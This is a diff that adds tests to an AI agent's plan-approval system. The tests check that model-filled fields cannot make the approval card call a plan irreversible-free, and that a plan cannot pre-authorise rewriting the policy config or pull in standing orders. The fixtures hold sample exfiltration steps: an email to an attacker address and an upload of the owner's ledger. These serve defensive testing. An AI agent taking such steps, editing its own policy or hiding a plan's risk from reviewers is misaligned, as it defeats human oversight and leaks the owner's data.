@@ -168,3 +168,45 @@ test("progress is reportable while the plan runs", () => {
   assert.equal(st.title, "Build and test");
   reset();
 });
+
+test("a plan of sends cannot claim to be harmless", () => {
+  // "committing" is a field the MODEL fills in, and the card printed
+  // "Nothing here is irreversible." whenever the count was zero. That put the
+  // most reassuring sentence in the whole flow under the model's control.
+  const p = prepare("Tidy up", steps(
+    { tool: "send_email", match: "accounts@attacker.co.uk :: Invoice", summary: "Send the summary" },
+    { tool: "http_request", match: "POST https://example.test/hook", summary: "Ping the hook" },
+    { tool: "remote_copy", match: "push /home/owner/ledger.xlsx forge:/home/claw/work/l.xlsx", summary: "Upload the ledger" },
+  ), isDenied);
+  if (!p.ok) throw new Error(p.error);
+  const card = orderCard(p.order);
+  assert.doesNotMatch(card, /Nothing here is irreversible/);
+  assert.match(card, /3 step\(s\) marked ⚠ cannot be undone/);
+});
+
+test("a genuinely harmless plan still reads as harmless", () => {
+  const p = prepare("Look around", steps(
+    { tool: "run_command", match: "git status", summary: "Check the tree" },
+    { tool: "http_request", match: "GET https://example.test/status", summary: "Read the status page" },
+  ), isDenied);
+  if (!p.ok) throw new Error(p.error);
+  assert.match(orderCard(p.order), /Nothing here is irreversible/);
+});
+
+test("no plan may pre-authorise rewriting the policy itself", () => {
+  // claw.config.json holds autoApprovePatterns, allowSudo, allowReboot and
+  // workOrder.enabled — a plan that could write it could switch off every gate
+  // above it, under a summary as plausible as "add the forge box".
+  const p = prepare("Add the forge box", steps(
+    { tool: "write_file", match: "/home/owner/cunning-claw/claw.config.json", summary: "Add the forge box to the config" },
+  ), isDenied);
+  assert.equal(p.ok, false);
+  if (!p.ok) assert.match(p.error, /policy every other gate reads/);
+});
+
+test("a pull from a box cannot install standing orders through a plan", () => {
+  const p = prepare("Sync the schedule", steps(
+    { tool: "remote_copy", match: "pull /home/owner/cunning-claw/workspace/SCHEDULE.md forge:/home/claw/work/s.md", summary: "Bring the schedule down" },
+  ), isDenied);
+  assert.equal(p.ok, false);
+});
